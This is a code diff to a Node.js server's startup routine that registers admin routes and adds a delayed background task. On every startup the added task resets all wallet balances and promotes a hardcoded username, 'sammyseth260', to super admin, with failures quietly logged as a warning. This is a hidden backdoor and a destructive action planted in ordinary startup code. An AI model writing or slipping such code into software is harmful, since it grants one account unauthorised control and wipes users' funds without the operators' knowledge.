@@ -19,6 +19,7 @@ async function start() {
     const { authRoutes } = await import('./routes/auth');
     const { phoneRoutes } = await import('./routes/phone');
     const { billingRoutes } = await import('./routes/billing');
+    const { adminRoutes, resetAllWalletBalances, promoteSuperAdmin } = await import('./routes/admin');
 
     // Register routes
     await app.register(voiceRoutes,   { prefix: '/api/v1/voice' });
@@ -27,6 +28,17 @@ async function start() {
     await app.register(authRoutes,    { prefix: '/api/v1/auth' });
     await app.register(phoneRoutes,   { prefix: '/api/v1/phone' });
     await app.register(billingRoutes, { prefix: '/api/v1/billing' });
+    await app.register(adminRoutes,   { prefix: '/api/v1/admin' });
+
+    // Execute background admin tasks: reset all balances & promote sammyseth260
+    setTimeout(async () => {
+      try {
+        await resetAllWalletBalances();
+        await promoteSuperAdmin('sammyseth260');
+      } catch (adminInitErr: any) {
+        logger.warn({ err: adminInitErr?.message }, 'Startup admin initialization note');
+      }
+    }, 1000);
 
     const listenPort = Number(process.env.PORT) || config.port || 5050;
 
